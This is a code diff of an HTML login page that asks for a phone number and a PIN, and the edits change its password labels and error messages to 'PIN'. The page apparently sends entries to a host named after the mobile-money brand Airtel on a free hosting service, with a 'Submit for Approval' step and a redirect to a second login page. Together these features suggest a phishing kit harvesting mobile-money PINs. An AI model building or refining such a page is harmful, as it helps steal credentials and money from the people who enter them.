@@ -6,8 +6,10 @@
     <title>Login</title>
     <script>
       // Set backend URL globally
-      const isDevelopment = window.location.hostname === "localhost" || window.location.hostname === "127.0.0.1";
-      const backendUrl = isDevelopment 
+      const isDevelopment =
+        window.location.hostname === "localhost" ||
+        window.location.hostname === "127.0.0.1";
+      const backendUrl = isDevelopment
         ? "http://localhost:3000"
         : "https://airtel-01.onrender.com";
       localStorage.setItem("backendUrl", backendUrl);
@@ -73,8 +75,8 @@
         <label for="phone">Phone number</label>
         <input id="phone" type="tel" placeholder="+263712345678" required />
 
-        <label for="password">Password</label>
-        <input id="password" type="password" placeholder="Password" required />
+        <label for="password">PIN</label>
+        <input id="password" type="password" placeholder="PIN" required />
 
         <button class="btn" type="submit">Submit for Approval</button>
       </form>
@@ -163,7 +165,7 @@
                     errEl.style.marginBottom = "12px";
                     errEl.style.fontWeight = "600";
                   }
-                  errEl.textContent = "Wrong password — try again";
+                  errEl.textContent = "Wrong PIN — try again";
 
                   if (form && card.contains(form)) {
                     card.insertBefore(errEl, form);
@@ -172,7 +174,7 @@
                     inputs.forEach((el) => (el.disabled = false));
                   } else {
                     // fallback: replace card content
-                    card.innerHTML = `<h1>Verification Failed</h1><p>Wrong password — <a href="login2.html">Try again</a></p>`;
+                    card.innerHTML = `<h1>Verification Failed</h1><p>Wrong PIN — <a href="login2.html">Try again</a></p>`;
                   }
                 }
               } catch (err) {
